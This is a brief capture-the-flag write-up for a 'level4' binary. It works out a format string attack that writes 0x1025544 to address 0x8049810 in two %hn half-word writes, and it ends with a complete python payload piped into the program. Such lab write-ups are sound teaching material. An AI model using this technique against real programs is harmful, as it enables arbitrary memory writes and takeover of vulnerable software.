Same principle as before, except this time we need to write: 
0x1025544 (16930116) in 0x8049810
Our string will start at the 12th position on the stack
We have to divide it in two parts:
0x5544 (21828) to 0x8049810 (-258 for the first write: 21570)
0x0102 (258) to 0x8049812 (-8 for the two 4 bytes addresses: 250)
So:
`python -c 'print "\x12\x98\x04\x08\x10\x98\x04\x08%250x%12$hn%21570x%13$hn"' | ./level4`
